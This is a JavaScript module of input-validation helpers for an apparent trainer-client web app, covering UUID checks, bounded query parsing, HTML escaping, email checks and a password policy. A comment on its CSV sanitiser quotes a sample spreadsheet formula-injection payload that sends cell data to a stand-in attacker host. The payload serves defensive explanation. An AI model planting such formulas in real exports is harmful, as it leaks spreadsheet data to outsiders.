'use strict';

/**
 * Shared input-validation helpers.
 *
 * Added during Security Hardening Phase 2A, extended in Phase 2B.
 *
 * Route parameters that are interpolated into UUID columns must be validated
 * before they reach PostgreSQL. An unvalidated value causes Postgres to raise
 * `invalid input syntax for type uuid`, which surfaces as a 500 and turns a
 * simple "not found" into an error-based information disclosure channel.
 * Validating up front lets those routes answer with the same 404 they use for
 * "exists but you don't own it", so an attacker cannot distinguish the two.
 */

// RFC 4122 UUID, any version. Anchored so no leading/trailing junk is accepted.
const UUID_RE =
  /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

/**
 * @param {unknown} value
 * @returns {boolean} true when `value` is a well-formed UUID string.
 */
const isUuid = (value) => typeof value === 'string' && UUID_RE.test(value);

/**
 * Parse a caller-supplied count (?limit=, ?months=, …) into a bounded integer.
 *
 * Phase 2B: several list endpoints passed `parseInt(req.query.limit)` straight
 * into a SQL LIMIT. Two problems followed from that. A large value let one
 * request pull an unbounded result set — cheap for the caller, expensive for
 * the database (OWASP API4). A non-numeric value produced NaN, which Postgres
 * rejects, turning a malformed query string into a 500.
 *
 * Anything unparseable falls back to `fallback`; anything out of range is
 * clamped rather than rejected, so a legitimate client asking for too much
 * still gets a useful answer instead of an error.
 *
 * @param {unknown} value  raw query-string value
 * @param {{fallback: number, max: number, min?: number}} bounds
 * @returns {number} an integer within [min, max]
 */
const parseBoundedInt = (value, { fallback, max, min = 1 }) => {
  const n = typeof value === 'number' ? value : parseInt(String(value ?? ''), 10);
  if (!Number.isFinite(n)) return fallback;
  return Math.min(max, Math.max(min, Math.trunc(n)));
};

/**
 * Neutralise spreadsheet formula injection in an exported cell value.
 *
 * Excel, LibreOffice and Google Sheets treat a leading =, +, -, @, tab or CR as
 * the start of a formula, so a client note reading
 * `=HYPERLINK("http://evil/?"&A1,"Click")` executes when the trainer opens
 * their own export. Prefixing with a single quote makes the cell literal text;
 * the quote is not displayed by spreadsheet applications.
 *
 * Applied to values only — never to header/field names, which the application
 * controls.
 *
 * @param {unknown} value
 * @returns {unknown} the value, made inert if it was a dangerous string
 */
const DANGEROUS_CSV_PREFIX = /^[=+\-@\t\r]/;
const sanitizeCsvValue = (value) => {
  if (typeof value !== 'string') return value;
  return DANGEROUS_CSV_PREFIX.test(value) ? `'${value}` : value;
};

/**
 * Escape a value for interpolation into an HTML email template.
 *
 * Transactional emails build HTML with `${firstName}` and friends. The values
 * are user-supplied, so without escaping they are an HTML-injection primitive
 * in whatever mail client renders the message.
 *
 * @param {unknown} value
 * @returns {string}
 */
const escapeHtml = (value) =>
  String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');

/**
 * Email format check.
 *
 * Deliberately conservative: one @, no whitespace, a dot-bearing domain. The
 * goal is to reject junk before it becomes a stored identity or an outbound
 * message, not to be RFC-5322 complete — the authoritative test of an address
 * is whether the verification mail arrives.
 *
 * @param {unknown} value
 * @returns {boolean}
 */
const EMAIL_RE = /^[^\s@]+@[^\s@.]+(\.[^\s@.]+)+$/;
const isEmail = (value) =>
  typeof value === 'string' && value.length <= 254 && EMAIL_RE.test(value.trim());

/** Normalise an address for storage and comparison. */
const normalizeEmail = (value) =>
  typeof value === 'string' ? value.toLowerCase().trim() : value;

/**
 * Server-side password policy.
 *
 * Registration used to apply no length check at all — the 6-character minimum
 * existed only in the React forms and in the reset/change endpoints, so
 * `POST /api/auth/register` accepted a one-character password from any caller
 * who skipped the UI. The minimum is kept at 6 to match what the rest of the
 * application (and the frontend) already states; raising it is a coordinated
 * frontend+backend change, recorded as follow-up work rather than slipped in
 * here.
 *
 * The upper bound is a resource-consumption guard: bcrypt ignores input past 72
 * bytes, so anything longer is cost without benefit.
 *
 * @param {unknown} password
 * @returns {{ok: true} | {ok: false, reason: string}}
 */
const MIN_PASSWORD_LENGTH = 6;
const MAX_PASSWORD_LENGTH = 200;
const validatePassword = (password) => {
  if (typeof password !== 'string') {
    return { ok: false, reason: 'Password must be a string' };
  }
  if (password.length < MIN_PASSWORD_LENGTH) {
    return { ok: false, reason: `Password must be at least ${MIN_PASSWORD_LENGTH} characters` };
  }
  if (password.length > MAX_PASSWORD_LENGTH) {
    return { ok: false, reason: `Password must be at most ${MAX_PASSWORD_LENGTH} characters` };
  }
  return { ok: true };
};

module.exports = {
  isUuid,
  parseBoundedInt,
  sanitizeCsvValue,
  escapeHtml,
  isEmail,
  normalizeEmail,
  validatePassword,
  MIN_PASSWORD_LENGTH,
  MAX_PASSWORD_LENGTH,
};
